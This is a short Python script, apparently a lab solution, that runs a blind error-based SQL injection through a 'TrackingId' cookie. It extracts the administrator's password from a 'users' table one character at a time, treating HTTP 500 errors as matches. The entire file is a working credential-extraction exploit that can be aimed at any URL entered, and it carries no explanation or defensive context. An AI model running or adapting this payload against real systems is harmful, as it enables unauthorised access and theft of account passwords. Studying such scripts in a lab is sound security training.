import requests
import string

characters = list(string.ascii_lowercase)
characters += list(string.digits)
url = input("Nhập URL:")
length = 20
result = ''

print("[+] Extract Info")

for i in range(1, length+1):
    for char in characters:
        payload = "a'||(SELECT CASE WHEN SUBSTR(password,%i,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" %(i, char)
        print("Tring Number %i with: " %(i), char)
        cookie = {"TrackingId":payload}
        response = requests.get(url, cookies=cookie)
        if response.status_code == 500:
            result += char
            break

    print("[+] Result is : ", result)